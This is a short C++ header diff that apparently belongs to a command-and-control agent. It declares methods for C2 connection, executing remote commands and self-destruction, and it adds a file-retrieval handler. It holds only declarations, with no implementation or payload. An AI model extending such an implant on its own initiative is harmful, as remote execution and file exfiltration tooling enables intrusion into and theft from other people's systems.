@@ -24,10 +24,10 @@ private:
     void c2Disconnect();
 
     agent::command::Request recvCommandRequest();
-    agent::command::Response processCommandRequest(agent::command::Request& request);
     void sendCommandResponse(agent::command::Response& response);
+    agent::command::Response processCommandRequest(agent::command::Request& request);
 
     std::string handleExecute(const std::string& command);
     void handleSelfDestroy();
-
+    void handleGetFile(const std::string& path, std::uint32_t suggestedChunkSize);
 };
